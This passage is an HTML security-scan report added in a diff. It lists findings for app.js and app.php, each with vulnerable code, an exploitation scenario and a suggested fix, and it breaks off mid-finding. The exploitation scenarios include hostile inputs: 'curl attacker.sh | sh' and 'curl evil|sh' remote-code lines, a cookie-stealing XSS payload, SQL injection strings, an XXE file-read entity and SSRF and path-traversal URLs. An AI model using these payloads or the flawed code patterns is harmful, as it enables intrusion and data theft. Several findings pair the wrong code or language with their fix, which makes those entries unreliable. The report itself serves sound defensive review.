@@ -1,0 +1,931 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>SecuRevealer Report — risk 100/100 (F)</title>
+<style>
+  :root { --bg:#0b0f17; --panel:#111827; --text:#e5e7eb; --muted:#9ca3af; --accent:#22d3ee; }
+  * { box-sizing:border-box; }
+  body { margin:0; font:15px/1.6 'Segoe UI',system-ui,sans-serif; background:var(--bg); color:var(--text); }
+  .wrap { max-width:960px; margin:0 auto; padding:32px 20px; }
+  header { display:flex; align-items:center; gap:24px; border-bottom:1px solid #1f2937; padding-bottom:24px; }
+  h1 { margin:0; font-size:24px; } h1 .sub { display:block; color:var(--muted); font-size:13px; font-weight:400; margin-top:4px; }
+  h2 { font-size:18px; margin:32px 0 12px; color:var(--accent); letter-spacing:.5px; text-transform:uppercase; }
+  h3 { margin:20px 0 8px; font-size:16px; } h3 .meta { color:var(--muted); font-weight:400; font-size:13px; }
+  .ring { --deg:360deg; width:110px; height:110px; border-radius:50%; flex:0 0 auto;
+    background:conic-gradient(var(--accent) var(--deg), #1f2937 0); display:flex; align-items:center; justify-content:center; }
+  .ring-inner { width:88px; height:88px; border-radius:50%; background:var(--bg); display:flex; flex-direction:column; align-items:center; justify-content:center; }
+  .grade { font-size:28px; font-weight:700; color:var(--accent); }
+  .score { font-size:11px; color:var(--muted); }
+  .stats { display:grid; grid-template-columns:repeat(auto-fit,minmax(120px,1fr)); gap:12px; margin:20px 0; }
+  .stat { background:var(--panel); border:1px solid #1f2937; border-radius:10px; padding:14px; text-align:center; }
+  .stat b { display:block; font-size:22px; }
+  .stat span { color:var(--muted); font-size:12px; }
+  table { width:100%; border-collapse:collapse; margin-top:8px; }
+  td, th { padding:8px 10px; border-bottom:1px solid #1f2937; text-align:left; }
+  td.num { text-align:right; width:40px; font-variant-numeric:tabular-nums; }
+  .bar { height:8px; background:#1f2937; border-radius:4px; overflow:hidden; }
+  .badge { padding:2px 10px; border-radius:99px; font-size:11px; font-weight:700; letter-spacing:.5px; }
+  .chip { background:#1f2937; color:var(--muted); border-radius:6px; padding:2px 8px; font-size:11px; }
+  .mono { font-family:'Cascadia Code',Consolas,monospace; font-size:12px; }
+  .loc { color:var(--accent); }
+  .finding { background:var(--panel); border:1px solid #1f2937; border-radius:10px; padding:14px 16px; margin:12px 0; }
+  .fhead { display:flex; align-items:center; gap:10px; flex-wrap:wrap; margin-bottom:8px; }
+  .why, .exploit, .refs { color:var(--muted); font-size:13.5px; margin:6px 0; }
+  .why em, .exploit em { color:var(--accent); font-style:normal; font-weight:600; }
+  .refs a { color:var(--accent); word-break:break-all; }
+  pre { background:#0b0f17; border:1px solid #1f2937; border-radius:8px; padding:12px; overflow-x:auto; font:12.5px/1.5 'Cascadia Code',Consolas,monospace; margin:8px 0; }
+  pre.fix { border-color:#14532d; }
+  pre.fix::before { content:'SUGGESTED FIX'; display:block; color:#34d399; font-size:10px; letter-spacing:1px; margin-bottom:6px; }
+  footer { margin-top:40px; border-top:1px solid #1f2937; padding-top:16px; color:var(--muted); font-size:12px; }
+  @media print { body { background:#fff; color:#111; } .ring { background:conic-gradient(#0ea5e9 var(--deg), #ddd var(--deg)); } }
+</style>
+</head>
+<body>
+<div class="wrap">
+  <header>
+    <div class="ring" style="--deg:360deg"><div class="ring-inner"><span class="grade">F</span><span class="score">100/100</span></div></div>
+    <h1>Security Review Report
+      <span class="sub">SecuRevealer v1.0.0 · 9/21/2026, 11:44:06 PM</span>
+    </h1>
+  </header>
+
+  <div class="stats">
+    <div class="stat"><b>52</b><span>findings</span></div>
+    <div class="stat"><b>5</b><span>files affected</span></div>
+    <div class="stat"><b>5</b><span>files scanned</span></div>
+    <div class="stat"><b>131</b><span>lines scanned</span></div>
+  </div>
+
+  <h2>Severity Breakdown</h2>
+  <table><tr><td><span class="badge" style="background:#ff4d6d22;color:#ff4d6d;border:1px solid #ff4d6d55">CRITICAL</span></td><td class="num">27</td><td><div class="bar"><div style="width:100%;background:#ff4d6d"></div></div></td></tr><tr><td><span class="badge" style="background:#ff9f4322;color:#ff9f43;border:1px solid #ff9f4355">HIGH</span></td><td class="num">21</td><td><div class="bar"><div style="width:100%;background:#ff9f43"></div></div></td></tr><tr><td><span class="badge" style="background:#f9c74f22;color:#f9c74f;border:1px solid #f9c74f55">MEDIUM</span></td><td class="num">4</td><td><div class="bar"><div style="width:20%;background:#f9c74f"></div></div></td></tr><tr><td><span class="badge" style="background:#4dd0e122;color:#4dd0e1;border:1px solid #4dd0e155">LOW</span></td><td class="num">0</td><td><div class="bar"><div style="width:0%;background:#4dd0e1"></div></div></td></tr></table>
+
+  <h2>Detailed Findings</h2>
+  
+    <section class="file">
+      <h3>app.js <span class="meta">(js, 16 findings, risk 100)</span></h3>
+      
+      <div class="finding" style="border-left:4px solid #ff4d6d">
+        <div class="fhead">
+          <span class="badge" style="background:#ff4d6d22;color:#ff4d6d;border:1px solid #ff4d6d55">CRITICAL</span>
+          <strong>Hardcoded secret / API key assignment</strong>
+          <span class="mono loc">line 9:11</span>
+          <span class="chip mono">HARDCODED_SECRET</span>
+          <span class="chip mono">CWE-798</span>
+        </div>
+        <p class="why"><em>Why it matters:</em> Credentials in source are exposed to every reader of the repo, its forks, and its full git history — rotation is the only remedy after exposure.</p>
+        <p class="exploit"><em>Exploitation scenario:</em> A scraped or leaked repo yields live keys; bots find them within minutes of a public push.</p>
+        <pre class="code"><code>const JWT_SECRET = 's3cr3t_key_do_not_share_123';     // hardcoded secret</code></pre>
+        <pre class="fix"><code>// AFTER
+const key = process.env.STRIPE_KEY;   // injected by vault/CI
+// add .env to .gitignore; rotate the exposed key NOW</code></pre>
+        <p class="refs">References: <a href="https://cheatsheetseries.owasp.org/cheatsheets/Secrets_Management_Cheat_Sheet.html">https://cheatsheetseries.owasp.org/cheatsheets/Secrets_Management_Cheat_Sheet.html</a></p>
+      </div>
+      <div class="finding" style="border-left:4px solid #ff4d6d">
+        <div class="fhead">
+          <span class="badge" style="background:#ff4d6d22;color:#ff4d6d;border:1px solid #ff4d6d55">CRITICAL</span>
+          <strong>Hardcoded AWS access key id</strong>
+          <span class="mono loc">line 10:18</span>
+          <span class="chip mono">HARDCODED_AWS_KEY</span>
+          <span class="chip mono">CWE-798</span>
+        </div>
+        <p class="why"><em>Why it matters:</em> AKIA… literals in code are directly usable access keys. Cloud providers scan and attackers scan harder.</p>
+        <p class="exploit"><em>Exploitation scenario:</em> With the paired secret key, attackers attach IAM escalation policies and empty out the account.</p>
+        <pre class="code"><code>const AWS_KEY = 'AKIAIOSFODNN7EXAMPLE';              // hardcoded AWS access key id</code></pre>
+        <pre class="fix"><code># AFTER — instance roles / OIDC federation
+# aws iam create-role with trust policy; attach minimal policy
+# then: no static keys exist at all</code></pre>
+        <p class="refs">References: <a href="https://owasp.org/www-project-top-ten/2021/A07_2021-Identification_and_Authentication_Failures">https://owasp.org/www-project-top-ten/2021/A07_2021-Identification_and_Authentication_Failures</a></p>
+      </div>
+      <div class="finding" style="border-left:4px solid #ff4d6d">
+        <div class="fhead">
+          <span class="badge" style="background:#ff4d6d22;color:#ff4d6d;border:1px solid #ff4d6d55">CRITICAL</span>
+          <strong>SQL query built with string concatenation</strong>
+          <span class="mono loc">line 15:6</span>
+          <span class="chip mono">SQLI_CONCAT</span>
+          <span class="chip mono">CWE-89</span>
+        </div>
+        <p class="why"><em>Why it matters:</em> The SQL statement is assembled by concatenation, so the database parser cannot tell your code from user data. Anything appended becomes executable SQL grammar.</p>
+        <p class="exploit"><em>Exploitation scenario:</em> An input value of `x'; DROP TABLE users; --` (or a blind `' OR 1=1 --`) terminates your string early and executes the attacker's statement, exfiltrating or destroying data.</p>
+        <pre class="code"><code>db.query('SELECT * FROM users WHERE id = ' + req.query.id);   // SQL injection</code></pre>
+        <pre class="fix"><code>// BEFORE (vulnerable)
+db.query(&quot;SELECT * FROM users WHERE id = &quot; + req.query.id);
+
+// AFTER (parameterized)
+db.query(&quot;SELECT * FROM users WHERE id = ?&quot;, [req.query.id]);</code></pre>
+        <p class="refs">References: <a href="https://owasp.org/Top10/A03_2021-Injection/">https://owasp.org/Top10/A03_2021-Injection/</a> · <a href="https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html">https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html</a></p>
+      </div>
+      <div class="finding" style="border-left:4px solid #ff4d6d">
+        <div class="fhead">
+          <span class="badge" style="background:#ff4d6d22;color:#ff4d6d;border:1px solid #ff4d6d55">CRITICAL</span>
+          <strong>Shell command built from string concatenation</strong>
+          <span class="mono loc">line 20:3</span>
+          <span class="chip mono">CMDI_SHELL</span>
+          <span class="chip mono">CWE-78</span>
+        </div>
+        <p class="why"><em>Why it matters:</em> Passing concatenated strings to exec/spawn invokes a shell that interprets metacharacters in the input as commands.</p>
+        <p class="exploit"><em>Exploitation scenario:</em> Input `file.txt; curl attacker.sh | sh` executes the attacker payload with the server process privileges — often root in containers.</p>
+        <pre class="code"><code>exec('convert ' + req.body.image + ' out.png');               // command injection</code></pre>
+        <pre class="fix"><code>// AFTER — arg array, no shell
+const { execFile } = require('child_process');
+execFile('convert', [userPath, outPath], cb);</code></pre>
+        <p class="refs">References: <a href="https://owasp.org/www-community/attacks/Command_Injection">https://owasp.org/www-community/attacks/Command_Injection</a></p>
+      </div>
+      <div class="finding" style="border-left:4px solid #ff4d6d">
+        <div class="fhead">
+          <span class="badge" style="background:#ff4d6d22;color:#ff4d6d;border:1px solid #ff4d6d55">CRITICAL</span>
+          <strong>Use of eval() on potentially untrusted data</strong>
+          <span class="mono loc">line 20:3</span>
+          <span class="chip mono">EVAL_USE</span>
+          <span class="chip mono">CWE-95</span>
+        </div>
+        <p class="why"><em>Why it matters:</em> eval/exec compiles and runs data as code inside your process. Any path from user input to eval equals full server-side RCE.</p>
+        <p class="exploit"><em>Exploitation scenario:</em> A &quot;calculator&quot; input like `require(&quot;child_process&quot;).execSync(&quot;curl evil|sh&quot;)` runs instantly, in-process, with your privileges.</p>
+        <pre class="code"><code>exec('convert ' + req.body.image + ' out.png');               // command injection</code></pre>
+        <pre class="fix"><code>// AFTER — parse instead of evaluate
+const value = JSON.parse(input); // data, not code
+// domain logic instead of dynamic code</code></pre>
+        <p class="refs">References: <a href="https://owasp.org/www-community/attacks/Code_Injection">https://owasp.org/www-community/attacks/Code_Injection</a></p>
+      </div>
+      <div class="finding" style="border-left:4px solid #ff4d6d">
+        <div class="fhead">
+          <span class="badge" style="background:#ff4d6d22;color:#ff4d6d;border:1px solid #ff4d6d55">CRITICAL</span>
+          <strong>Use of eval() on potentially untrusted data</strong>
+          <span class="mono loc">line 25:3</span>
+          <span class="chip mono">EVAL_USE</span>
+          <span class="chip mono">CWE-95</span>
+        </div>
+        <p class="why"><em>Why it matters:</em> eval/exec compiles and runs data as code inside your process. Any path from user input to eval equals full server-side RCE.</p>
+        <p class="exploit"><em>Exploitation scenario:</em> A &quot;calculator&quot; input like `require(&quot;child_process&quot;).execSync(&quot;curl evil|sh&quot;)` runs instantly, in-process, with your privileges.</p>
+        <pre class="code"><code>eval(req.query.expr);                                          // code injection</code></pre>
+        <pre class="fix"><code>// AFTER — parse instead of evaluate
+const value = JSON.parse(input); // data, not code
+// domain logic instead of dynamic code</code></pre>
+        <p class="refs">References: <a href="https://owasp.org/www-community/attacks/Code_Injection">https://owasp.org/www-community/attacks/Code_Injection</a></p>
+      </div>
+      <div class="finding" style="border-left:4px solid #ff9f43">
+        <div class="fhead">
+          <span class="badge" style="background:#ff9f4322;color:#ff9f43;border:1px solid #ff9f4355">HIGH</span>
+          <strong>CORS wildcard with credentials</strong>
+          <span class="mono loc">line 12:16</span>
+          <span class="chip mono">WILDCARD_CORS</span>
+          <span class="chip mono">CWE-942</span>
+        </div>
+        <p class="why"><em>Why it matters:</em> Access-Control-Allow-Origin: * with credentials enabled lets any origin read authenticated responses.</p>
+        <p class="exploit"><em>Exploitation scenario:</em> evil.com JS fetches victim-session data from your API; the browser hands it over because CORS said yes.</p>
+        <pre class="code"><code>app.use(cors({ origin: '*', credentials: true }));   // wildcard CORS</code></pre>
+        <pre class="fix"><code>// AFTER — explicit allowlist
+const allow = ['https://app.yourdomain.com'];
+cors({ origin: (o, cb) =&gt; cb(null, allow.includes(o)), credentials: true })</code></pre>
+        <p class="refs">References: <a href="https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html">https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html</a></p>
+      </div>
+      <div class="finding" style="border-left:4px solid #ff9f43">
+        <div class="fhead">
+          <span class="badge" style="background:#ff9f4322;color:#ff9f43;border:1px solid #ff9f4355">HIGH</span>
+          <strong>Untrusted content assigned to innerHTML / document.write</strong>
+          <span class="mono loc">line 24:34</span>
+          <span class="chip mono">XSS_INNERHTML</span>
+          <span class="chip mono">CWE-79</span>
+        </div>
+        <p class="why"><em>Why it matters:</em> innerHTML parses its assignment as HTML, including &lt;script&gt; and event handlers. User data becomes executable DOM.</p>
+        <p class="exploit"><em>Exploitation scenario:</em> A comment field containing `&lt;img src=x onerror=&quot;fetch('//evil/?c='+document.cookie)&quot;&gt;` runs in every viewer's session.</p>
+        <pre class="code"><code>document.getElementById('out').innerHTML = req.query.name;    // XSS sink</code></pre>
+        <pre class="fix"><code>// AFTER
+el.textContent = userInput;               // safe sink
+// if HTML is truly needed: DOMPurify.sanitize(html)</code></pre>
+        <p class="refs">References: <a href="https://owasp.org/www-community/attacks/xss/">https://owasp.org/www-community/attacks/xss/</a></p>
+      </div>
+      <div class="finding" style="border-left:4px solid #ff9f43">
+        <div class="fhead">
+          <span class="badge" style="background:#ff9f4322;color:#ff9f43;border:1px solid #ff9f4355">HIGH</span>
+          <strong>Weak hash algorithm (MD5 / SHA1)</strong>
+          <span class="mono loc">line 29:20</span>
+          <span class="chip mono">WEAK_HASH</span>
+          <span class="chip mono">CWE-327</span>
+        </div>
+        <p class="why"><em>Why it matters:</em> MD5/SHA1 are collision-broken and far too fast for password storage — GPU rigs guess billions/second.</p>
+        <p class="exploit"><em>Exploitation scenario:</em> Stolen MD5 password dumps are cracked at scale in hours; identical hashes also leak logins across sites.</p>
+        <pre class="code"><code>const h = crypto.createHash('md5').update(req.query.pw).digest('hex');  // weak hash</code></pre>
+        <pre class="fix"><code>// AFTER — passwords:
+const bcrypt = require('bcrypt');
+await bcrypt.hash(pw, 12);
+// integrity: crypto.createHash('sha256')</code></pre>
+        <p class="refs">References: <a href="https://cheatsheetseries.owasp.org/cheatsheets/Password_Storage_Cheat_Sheet.html">https://cheatsheetseries.owasp.org/cheatsheets/Password_Storage_Cheat_Sheet.html</a></p>
+      </div>
+      <div class="finding" style="border-left:4px solid #ff9f43">
+        <div class="fhead">
+          <span class="badge" style="background:#ff9f4322;color:#ff9f43;border:1px solid #ff9f4355">HIGH</span>
+          <strong>Server-side request built from user-controlled URL</strong>
+          <span class="mono loc">line 35:3</span>
+          <span class="chip mono">SSRF_URL_INPUT</span>
+          <span class="chip mono">CWE-918</span>
+        </div>
+        <p class="why"><em>Why it matters:</em> The server fetches an attacker-chosen URL, so the request originates from inside your network — firewalls see it as trusted.</p>
+        <p class="exploit"><em>Exploitation scenario:</em> Target http://169.254.169.254/latest/meta-data/ to steal cloud credentials, or internal admin panels.</p>
+        <pre class="code"><code>fetch(req.body.url).then(r =&gt; r.text()).then(t =&gt; res.send(t)); // SSRF</code></pre>
+        <pre class="fix"><code>// AFTER — allowlist + resolve check
+const u = new URL(input);
+if (!ALLOWED_HOSTS.has(u.hostname)) throw new Error('blocked');
+// resolve DNS first, reject private ranges (169.254.0.0/16, 10/8, 127/8)</code></pre>
+        <p class="refs">References: <a href="https://owasp.org/www-community/attacks/Server_Side_Request_Forgery">https://owasp.org/www-community/attacks/Server_Side_Request_Forgery</a></p>
+      </div>
+      <div class="finding" style="border-left:4px solid #ff9f43">
+        <div class="fhead">
+          <span class="badge" style="background:#ff9f4322;color:#ff9f43;border:1px solid #ff9f4355">HIGH</span>
+          <strong>TLS certificate verification disabled</strong>
+          <span class="mono loc">line 36:45</span>
+          <span class="chip mono">TLS_VERIFY_OFF</span>
+          <span class="chip mono">CWE-295</span>
+        </div>
+        <p class="why"><em>Why it matters:</em> With verification disabled, any MITM (rogue Wi-Fi, BGP hijack, hostile proxy) presents any certificate and it is accepted.</p>
+        <p class="exploit"><em>Exploitation scenario:</em> Credentials and tokens are read in transit; payloads replaced silently.</p>
+        <pre class="code"><code>https.get('http://api.internal/health', { rejectUnauthorized: false }); // TLS off + plaintext</code></pre>
+        <pre class="fix"><code># AFTER
+# python: verify=True (default) + corporate CA via certifi
+# node: do NOT set rejectUnauthorized:false — add CA bundle instead</code></pre>
+        <p class="refs">References: <a href="https://cheatsheetseries.owasp.org/cheatsheets/Transport_Layer_Protection_Cheat_Sheet.html">https://cheatsheetseries.owasp.org/cheatsheets/Transport_Layer_Protection_Cheat_Sheet.html</a></p>
+      </div>
+      <div class="finding" style="border-left:4px solid #ff9f43">
+        <div class="fhead">
+          <span class="badge" style="background:#ff9f4322;color:#ff9f43;border:1px solid #ff9f4355">HIGH</span>
+          <strong>Open redirect from request parameter</strong>
+          <span class="mono loc">line 39:32</span>
+          <span class="chip mono">OPEN_REDIRECT</span>
+          <span class="chip mono">CWE-601</span>
+        </div>
+        <p class="why"><em>Why it matters:</em> Redirecting to a request-supplied URL turns your domain into the first hop of a phishing chain.</p>
+        <p class="exploit"><em>Exploitation scenario:</em> https://bank.com/logout?next=https://evil-clone.com — users see a trusted domain, then a fake login.</p>
+        <pre class="code"><code>app.get('/jump', (req, res) =&gt; res.redirect(req.query.next));    // open redirect</code></pre>
+        <pre class="fix"><code>// AFTER — local paths only
+const t = new URL(target, 'https://your.app');
+if (t.origin !== BASE_ORIGIN) t = '/';  // or use allowlist</code></pre>
+        <p class="refs">References: <a href="https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html">https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html</a></p>
+      </div>
+      <div class="finding" style="border-left:4px solid #ff9f43">
+        <div class="fhead">
+          <span class="badge" style="background:#ff9f4322;color:#ff9f43;border:1px solid #ff9f4355">HIGH</span>
+          <strong>File path built from user input without sanitization</strong>
+          <span class="mono loc">line 42:6</span>
+          <span class="chip mono">PATH_TRAVERSAL_JOIN</span>
+          <span class="chip mono">CWE-22</span>
+        </div>
+        <p class="why"><em>Why it matters:</em> User input joins a base path; ../ (or absolute paths, or NUL bytes) escape the base directory before any check.</p>
+        <p class="exploit"><em>Exploitation scenario:</em> GET /download?name=../../etc/passwd reads arbitrary files; write variants plant webshells.</p>
+        <pre class="code"><code>fs.readFile(path.join(__dirname, req.query.name), (e, d) =&gt; res.send(d)); // path traversal</code></pre>
+        <pre class="fix"><code>// AFTER
+const base = path.resolve(__dirname, 'files');
+const target = path.resolve(base, userPath);
+if (!target.startsWith(base + path.sep)) return res.status(400).end();</code></pre>
+        <p class="refs">References: <a href="https://owasp.org/www-community/attacks/Path_Traversal">https://owasp.org/www-community/attacks/Path_Traversal</a></p>
+      </div>
+      <div class="finding" style="border-left:4px solid #ff9f43">
+        <div class="fhead">
+          <span class="badge" style="background:#ff9f4322;color:#ff9f43;border:1px solid #ff9f4355">HIGH</span>
+          <strong>JWT with none / weak algorithm</strong>
+          <span class="mono loc">line 45:33</span>
+          <span class="chip mono">JWT_NONE_ALG</span>
+          <span class="chip mono">CWE-347</span>
+        </div>
+        <p class="why"><em>Why it matters:</em> Accepting &quot;none&quot; or downgradable algorithms lets tokens be re-signed without any secret.</p>
+        <p class="exploit"><em>Exploitation scenario:</em> Take a valid token, set alg:none, claim {&quot;role&quot;:&quot;admin&quot;} — signature block optional.</p>
+        <pre class="code"><code>jwt.verify(token, JWT_SECRET, { algorithms: ['none'] });         // JWT none alg</code></pre>
+        <pre class="fix"><code>// AFTER
+jwt.verify(token, publicKey, { algorithms: ['RS256'] });</code></pre>
+        <p class="refs">References: <a href="https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html">https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html</a></p>
+      </div>
+      <div class="finding" style="border-left:4px solid #f9c74f">
+        <div class="fhead">
+          <span class="badge" style="background:#f9c74f22;color:#f9c74f;border:1px solid #f9c74f55">MEDIUM</span>
+          <strong>Sensitive route without visible auth middleware</strong>
+          <span class="mono loc">line 14:1</span>
+          <span class="chip mono">NO_AUTH_MIDDLEWARE_HINT</span>
+          <span class="chip mono">CWE-306</span>
+        </div>
+        <p class="why"><em>Why it matters:</em> The route name suggests sensitive data/operations, but no authentication middleware appears in its handler chain.</p>
+        <p class="exploit"><em>Exploitation scenario:</em> Unauthenticated GET /admin/export dumps user data to anyone who guesses the URL.</p>
+        <pre class="code"><code>app.get('/user', (req, res) =&gt; {</code></pre>
+        <pre class="fix"><code>// AFTER
+app.get('/admin/export', requireAuth, requireRole('admin'), handler);</code></pre>
+        <p class="refs">References: <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/">https://owasp.org/Top10/A01_2021-Broken_Access_Control/</a></p>
+      </div>
+      <div class="finding" style="border-left:4px solid #f9c74f">
+        <div class="fhead">
+          <span class="badge" style="background:#f9c74f22;color:#f9c74f;border:1px solid #f9c74f55">MEDIUM</span>
+          <strong>Math.random / random module used for security decisions</strong>
+          <span class="mono loc">line 30:17</span>
+          <span class="chip mono">INSECURE_RANDOM</span>
+          <span class="chip mono">CWE-338</span>
+        </div>
+        <p class="why"><em>Why it matters:</em> Math.random / random.* are Mersenne Twister-class PRNGs: observe a few outputs and future ones are predictable.</p>
+        <p class="exploit"><em>Exploitation scenario:</em> Session tokens and reset links generated this way are brute-forceable from a handful of samples.</p>
+        <pre class="code"><code>const token = Math.random().toString(36);                     // insecure random</code></pre>
+        <pre class="fix"><code>// AFTER
+const { randomBytes, randomUUID } = require('crypto');
+const token = randomBytes(32).toString('hex');
+# py: secrets.token_urlsafe(32)</code></pre>
+        <p class="refs">References: <a href="https://cheatsheetseries.owasp.org/cheatsheets/Cryptographic_Storage_Cheat_Sheet.html#glossary">https://cheatsheetseries.owasp.org/cheatsheets/Cryptographic_Storage_Cheat_Sheet.html#glossary</a></p>
+      </div>
+    </section>
+
+    <section class="file">
+      <h3>app.php <span class="meta">(php, 9 findings, risk 84)</span></h3>
+      
+      <div class="finding" style="border-left:4px solid #ff4d6d">
+        <div class="fhead">
+          <span class="badge" style="background:#ff4d6d22;color:#ff4d6d;border:1px solid #ff4d6d55">CRITICAL</span>
+          <strong>Use of eval() on potentially untrusted data</strong>
+          <span class="mono loc">line 8:1</span>
+          <span class="chip mono">EVAL_USE</span>
+          <span class="chip mono">CWE-95</span>
+        </div>
+        <p class="why"><em>Why it matters:</em> eval/exec compiles and runs data as code inside your process. Any path from user input to eval equals full server-side RCE.</p>
+        <p class="exploit"><em>Exploitation scenario:</em> A &quot;calculator&quot; input like `require(&quot;child_process&quot;).execSync(&quot;curl evil|sh&quot;)` runs instantly, in-process, with your privileges.</p>
+        <pre class="code"><code>exec(&quot;ping -c 1 &quot; . $_GET['host']);                  // command injection</code></pre>
+        <pre class="fix"><code>// AFTER — parse instead of evaluate
+const value = JSON.parse(input); // data, not code
+// domain logic instead of dynamic code</code></pre>
+        <p class="refs">References: <a href="https://owasp.org/www-community/attacks/Code_Injection">https://owasp.org/www-community/attacks/Code_Injection</a></p>
+      </div>
+      <div class="finding" style="border-left:4px solid #ff4d6d">
+        <div class="fhead">
+          <span class="badge" style="background:#ff4d6d22;color:#ff4d6d;border:1px solid #ff4d6d55">CRITICAL</span>
+          <strong>PHP shell function fed request input</strong>
+          <span class="mono loc">line 8:1</span>
+          <span class="chip mono">CMDI_PHP</span>
+          <span class="chip mono">CWE-78</span>
+        </div>
+        <p class="why"><em>Why it matters:</em> This pattern matches a known insecure coding idiom.</p>
+        <p class="exploit"><em>Exploitation scenario:</em> Exploitability depends on whether user-controlled data can reach this code path.</p>
+        <pre class="code"><code>exec(&quot;ping -c 1 &quot; . $_GET['host']);                  // command injection</code></pre>
+        <pre class="fix"><code>// Review and replace with the framework's safe API.</code></pre>
+        <p class="refs">References: <a href="https://owasp.org/www-project-top-ten/">https://owasp.org/www-project-top-ten/</a></p>
+      </div>
+      <div class="finding" style="border-left:4px solid #ff4d6d">
+        <div class="fhead">
+          <span class="badge" style="background:#ff4d6d22;color:#ff4d6d;border:1px solid #ff4d6d55">CRITICAL</span>
+          <strong>Local file inclusion from request parameter</strong>
+          <span class="mono loc">line 9:1</span>
+          <span class="chip mono">PHP_LFI</span>
+          <span class="chip mono">CWE-98</span>
+        </div>
+        <p class="why"><em>Why it matters:</em> This pattern matches a known insecure coding idiom.</p>
+        <p class="exploit"><em>Exploitation scenario:</em> Exploitability depends on whether user-controlled data can reach this code path.</p>
+        <pre class="code"><code>include($_GET['page']);                              // local/remote file inclusion</code></pre>
+        <pre class="fix"><code>// Review and replace with the framework's safe API.</code></pre>
+        <p class="refs">References: <a href="https://owasp.org/www-project-top-ten/">https://owasp.org/www-project-top-ten/</a></p>
+      </div>
+      <div class="finding" style="border-left:4px solid #ff4d6d">
+        <div class="fhead">
+          <span class="badge" style="background:#ff4d6d22;color:#ff4d6d;border:1px solid #ff4d6d55">CRITICAL</span>
+          <strong>Use of eval() on potentially untrusted data</strong>
+          <span class="mono loc">line 10:1</span>
+          <span class="chip mono">EVAL_USE</span>
+          <span class="chip mono">CWE-95</span>
+        </div>
+        <p class="why"><em>Why it matters:</em> eval/exec compiles and runs data as code inside your process. Any path from user input to eval equals full server-side RCE.</p>
+        <p class="exploit"><em>Exploitation scenario:</em> A &quot;calculator&quot; input like `require(&quot;child_process&quot;).execSync(&quot;curl evil|sh&quot;)` runs instantly, in-process, with your privileges.</p>
+        <pre class="code"><code>eval($_POST['code']);                                // arbitrary code execution</code></pre>
+        <pre class="fix"><code>// AFTER — parse instead of evaluate
+const value = JSON.parse(input); // data, not code
+// domain logic instead of dynamic code</code></pre>
+        <p class="refs">References: <a href="https://owasp.org/www-community/attacks/Code_Injection">https://owasp.org/www-community/attacks/Code_Injection</a></p>
+      </div>
+      <div class="finding" style="border-left:4px solid #ff4d6d">
+        <div class="fhead">
+          <span class="badge" style="background:#ff4d6d22;color:#ff4d6d;border:1px solid #ff4d6d55">CRITICAL</span>
+          <strong>Hardcoded secret / API key assignment</strong>
+          <span class="mono loc">line 12:2</span>
+          <span class="chip mono">HARDCODED_SECRET</span>
+          <span class="chip mono">CWE-798</span>
+        </div>
+        <p class="why"><em>Why it matters:</em> Credentials in source are exposed to every reader of the repo, its forks, and its full git history — rotation is the only remedy after exposure.</p>
+        <p class="exploit"><em>Exploitation scenario:</em> A scraped or leaked repo yields live keys; bots find them within minutes of a public push.</p>
+        <pre class="code"><code>$password = &quot;Hunter2Password!&quot;;                      // hardcoded password</code></pre>
+        <pre class="fix"><code>// AFTER
+const key = process.env.STRIPE_KEY;   // injected by vault/CI
+// add .env to .gitignore; rotate the exposed key NOW</code></pre>
+        <p class="refs">References: <a href="https://cheatsheetseries.owasp.org/cheatsheets/Secrets_Management_Cheat_Sheet.html">https://cheatsheetseries.owasp.org/cheatsheets/Secrets_Management_Cheat_Sheet.html</a></p>
+      </div>
+      <div class="finding" style="border-left:4px solid #ff4d6d">
+        <div class="fhead">
+          <span class="badge" style="background:#ff4d6d22;color:#ff4d6d;border:1px solid #ff4d6d55">CRITICAL</span>
+          <strong>XML parser with external entities enabled (XXE)</strong>
+          <span class="mono loc">line 14:8</span>
+          <span class="chip mono">XXE_PARSER</span>
+          <span class="chip mono">CWE-611</span>
+        </div>
+        <p class="why"><em>Why it matters:</em> Default XML parsers honor DOCTYPE external entities, mixing local file reads and HTTP fetches into your parse.</p>
+        <p class="exploit"><em>Exploitation scenario:</em> `&lt;!DOCTYPE r [&lt;!ENTITY x SYSTEM &quot;file:///etc/passwd&quot;&gt;]&gt;&lt;r&gt;&amp;x;&lt;/r&gt;` returns the file in the response.</p>
+        <pre class="code"><code>$xml = simplexml_load_string($_GET['xmlbody']);      // XXE candidate</code></pre>
+        <pre class="fix"><code># py — defusedxml
+defusedxml.ElementTree.fromstring(data)
+# java: factory.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true)</code></pre>
+        <p class="refs">References: <a href="https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing">https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing</a></p>
+      </div>
+      <div class="finding" style="border-left:4px solid #ff4d6d">
+        <div class="fhead">
+          <span class="badge" style="background:#ff4d6d22;color:#ff4d6d;border:1px solid #ff4d6d55">CRITICAL</span>
+          <strong>Unsafe deserialization (pickle / yaml.load / unserialize)</strong>
+          <span class="mono loc">line 16:6</span>
+          <span class="chip mono">DESERIALIZE_UNSAFE</span>
+          <span class="chip mono">CWE-502</span>
+        </div>
+        <p class="why"><em>Why it matters:</em> Pickle/yaml.load/unserialize instantiate arbitrary objects from the byte stream. Attackers craft &quot;gadget chains&quot; that end in code execution.</p>
+        <p class="exploit"><em>Exploitation scenario:</em> A POSTed session cookie containing a crafted pickle runs commands on unpickle — no other vulnerability needed.</p>
+        <pre class="code"><code>echo unserialize($_COOKIE['cart']);                  // unsafe deserialization</code></pre>
+        <pre class="fix"><code># AFTER
+json.loads(data)                      # structured data only
